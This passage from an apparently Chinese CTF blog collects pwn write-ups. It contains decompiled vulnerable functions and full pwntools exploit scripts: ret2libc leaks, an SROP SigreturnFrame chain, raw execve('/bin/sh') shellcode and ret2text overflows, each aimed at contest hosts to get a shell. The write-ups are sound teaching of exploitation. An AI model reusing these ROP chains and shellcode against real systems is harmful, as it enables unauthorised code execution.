class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    read_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">1</span>,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax_ret,<span class="number">1</span>,</span><br><span class="line">    write_addr,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendafter(<span class="string">&quot;You should tell her your name first&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(bss_addr+<span class="number">0x30</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendafter(<span class="string">&quot;what do you want to say to her?&quot;</span>,payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h3><p>一题看似简单的libc，实则不简单</p><p>checksec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">revenge</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">528</span>]; <span class="comment">// [rsp+0h] [rbp-220h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+210h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+217h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v6++;</span><br><span class="line">    v5 = v0;</span><br><span class="line">    v2[v0] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = v6;</span><br><span class="line">  v2[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数就是简单的用puts输出了一段内容然后调用漏洞函数，漏洞函数逐个字符循环读取键盘输入到v2中存在栈溢出，但是这道题难在没有关键gadget：”pop rdi;ret”导致无法直接构造rop链泄露libc版本，唯一一个pop只有pop rbp可能只能靠这个来传参然后就卡住了</p><p>浮现版：</p><p>观察发现revenge函数内存在数组溢出，注意缓冲区的设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入流设置的无缓冲，输出流设置的全缓冲</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/XY.png" alt="1"></p><p>程序中并没有fflush函数，想要改变setbuf的参数也比较困难故选择将缓冲区填满使得我们能够用puts泄露出其实际地址来找libc</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;47.94.103.208&quot;</span>,<span class="number">22660</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc1.so&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text,data          :io.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text,data          :io.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :io.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">inf     =  <span class="keyword">lambda</span> s                 :info(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> ==&gt; 0x<span class="subst">&#123;<span class="built_in">eval</span>(s):x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x0000000000401180</span><span class="comment">#&#x27;&#x27;&#x27;mov rdi, rsi ; ret&#x27;&#x27;&#x27;</span></span><br><span class="line">xor_rsi = <span class="number">0x00000000004010e4</span><span class="comment">#&#x27;&#x27;&#x27;and rsi, 0 ; ret&#x27;&#x27;&#x27;将rsi清零</span></span><br><span class="line">add_rsi_rbp20 = <span class="number">0x00000000004010eb</span><span class="comment">#add rsi, dword ptr [rbp + 0x20] ; ret</span></span><br><span class="line">rbp = <span class="number">0x000000000040117d</span><span class="comment">#&#x27;&#x27;&#x27;pop rbp ; ret&#x27;&#x27;&#x27;</span></span><br><span class="line">ret =<span class="number">0x000000000040101a</span></span><br><span class="line">magic = <span class="number">0x00000000004010eb</span><span class="comment">#add rsi, dword ptr [rbp + 0x20] ; ret</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x218</span>+<span class="string">b&#x27;\x18&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x1d&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+p64(bss+<span class="number">0x220</span>)+p64(<span class="number">0x401207</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">8</span>)+p64(<span class="number">0x404060</span>)+p64(<span class="number">0x404018</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\x18&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x1d&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+p64(<span class="number">0x404300</span>-<span class="number">0x20</span>)\</span><br><span class="line">    +p64(xor_rsi)+p64(add_rsi_rbp20)+p64(gadget1)+p64(<span class="number">0x401070</span>)\</span><br><span class="line">        +p64(rbp)+p64(<span class="number">0x4042e0</span>-<span class="number">0x20</span>)+p64(xor_rsi)+p64(add_rsi_rbp20)+p64(gadget1)+p64(xor_rsi)+p64(<span class="number">0x4010a0</span>)+p64(rbp)+p64(bss+<span class="number">0x420</span>)+p64(<span class="number">0x401207</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">rl()</span><br><span class="line">puts = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">inf(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">libc.address = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;directory /home/yxhueimie/Desktop/glibc_source/glibc-2.35/libio\nb *0x401261\nc&#x27;)</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">8</span>)+p64(<span class="number">0x404758</span>)+p64(<span class="number">0x404018</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\x18&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x1d&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+p64(<span class="number">0x4044f8</span>-<span class="number">0x20</span>)+p64(xor_rsi)+p64(add_rsi_rbp20)+p64(gadget1)+p64(ret)*<span class="number">2</span>+p64(ret)*<span class="number">0x40</span>+p64(system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="商丘师范学院新生赛4-7"><a href="#商丘师范学院新生赛4-7" class="headerlink" title="商丘师范学院新生赛4.7"></a>商丘师范学院新生赛4.7</h2><p>浅红欺醉粉，肯信有江梅</p><p>nc连接直接<code>ls``cat</code></p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/%E5%95%86%E4%B8%981.png" alt="1"></p><p>领取你的小猫娘</p><p>简单栈溢出</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30010</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x40121B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h3><p>主要汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401000</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000401004</span> B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401009</span> BF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">1</span>                          ; fd</span><br><span class="line">.text:<span class="number">000000000040100</span>E <span class="number">48</span> BE <span class="number">00</span> <span class="number">20</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     rsi, offset msg                 ; buf</span><br><span class="line">.text:<span class="number">0000000000401018</span> BA <span class="number">3</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">3</span>Ah ; <span class="string">&#x27;:&#x27;</span>                  ; count</span><br><span class="line">.text:<span class="number">000000000040101</span>D <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">000000000040101F</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401024</span> BF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">0</span>                          ; fd</span><br><span class="line">.text:<span class="number">0000000000401029</span> <span class="number">48</span> <span class="number">89</span> E6                      mov     rsi, rsp                        ; buf</span><br><span class="line">.text:<span class="number">000000000040102</span>C BA <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">400</span>h                       ; count</span><br><span class="line">.text:<span class="number">0000000000401031</span> <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">0000000000401033</span> BA <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">8</span>                          ; count</span><br><span class="line">.text:<span class="number">0000000000401038</span> B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">000000000040103</span>D BF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">1</span>                          ; fd</span><br><span class="line">.text:<span class="number">0000000000401042</span> <span class="number">48</span> <span class="number">89</span> E6                      mov     rsi, rsp                        ; buf</span><br><span class="line">.text:<span class="number">0000000000401045</span> <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000401047</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401048</span> C3                            retn</span><br></pre></td></tr></table></figure><p>伪代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 start()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v0; // rax</span><br><span class="line">  signed __int64 v1; // rax</span><br><span class="line">  char v3[8]; // [rsp+0h] [rbp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  v0 = sys_write(1u, &amp;msg, 58uLL);</span><br><span class="line">  v1 = sys_read(0, v3, 0x400uLL);</span><br><span class="line">  return sys_write(1u, v3, 8uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始看到是系统调用read有点蒙，直接用gdb调试</p><p>有&#x2F;bin&#x2F;sh存在栈溢出，什么保护都没开但不能直接构造rop链gadget不太够用这里尝试伪造栈帧通过系统调用sys_rt_sigreturn 改变寄存器状态从而系统调用execve(“&#x2F;bin&#x2F;sh,0,0”)</p><p>要系统调用execve(“&#x2F;bin&#x2F;sh,0,0”)需要控制以下寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdi --&gt; /bin/sh地址（题目中给到了）</span><br><span class="line">rsi --&gt; 0</span><br><span class="line">rdx --&gt;0</span><br><span class="line">rax --&gt;3b</span><br></pre></td></tr></table></figure><p>故通过伪造信号帧的方式来调整寄存器的值</p><p>先利用已有gadget进行系统调用  sys_rt_sigreturn</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0xf</span>)+p64(syscall)</span><br></pre></td></tr></table></figure><p>因为是系统调用read只在最后有pop rbp ret的操作故栈上前8个字节会弹到rbp中rsp+8，原rbp处变成了返回地址弹到rip中，故只填充8个字节pop_rax会被放到rip中执行</p><p>利用pwntool库中的SigreturnFrame函数伪造信号帧并将其转换为字节序列压入栈中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake = SigreturnFrame()  </span><br><span class="line">fake.rax = <span class="number">0x3b</span></span><br><span class="line">fake.rdi = <span class="number">0x40203A</span></span><br><span class="line">fake.rdx = <span class="number">0</span></span><br><span class="line">fake.rsi = <span class="number">0</span></span><br><span class="line">fake.rsp = <span class="number">0x402044</span></span><br><span class="line">fake.rip = <span class="number">0x401045</span></span><br><span class="line">payload+=<span class="built_in">bytes</span>(fake)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;qterminal&#x27;,&#x27;-e&#x27;]</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">&#x27;./pwn01&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30956</span>)</span><br><span class="line">pop_rax=<span class="number">0x000000000040104a</span></span><br><span class="line">bin_sh=<span class="number">0x40203a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(pop_rax)</span><br><span class="line">payload+=p64(<span class="number">0xf</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401045</span>)</span><br><span class="line">fake = SigreturnFrame()  </span><br><span class="line">fake.rax = <span class="number">0x3b</span></span><br><span class="line">fake.rdi = <span class="number">0x40203A</span></span><br><span class="line">fake.rdx = <span class="number">0</span></span><br><span class="line">fake.rsi = <span class="number">0</span></span><br><span class="line">fake.rsp = <span class="number">0x402044</span></span><br><span class="line">fake.rip = <span class="number">0x401045</span></span><br><span class="line">payload+=<span class="built_in">bytes</span>(fake)</span><br><span class="line">+gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我觉君非池中物，咫尺蛟龙云雨</p><p>虽然保护全开但是用 mprotect函数使得bss段可读写执行故直接写shellcode即可</p><p>注意要小于0x30个字节我用了个24字节的</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32618</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b* 0x401031&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印或发送payload</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;window.&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>江南无所有，聊赠一枝春</p><p>简单ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn01&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32599</span>)</span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4011DC</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)+p64(gift)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="TGCTF"><a href="#TGCTF" class="headerlink" title="TGCTF"></a>TGCTF</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>简单的签到题，栈溢出构造rop链泄露libc基地址接着构造<code>system(/bin/sh)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">32243</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x401060</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401176</span> </span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="number">0x1d8678</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span 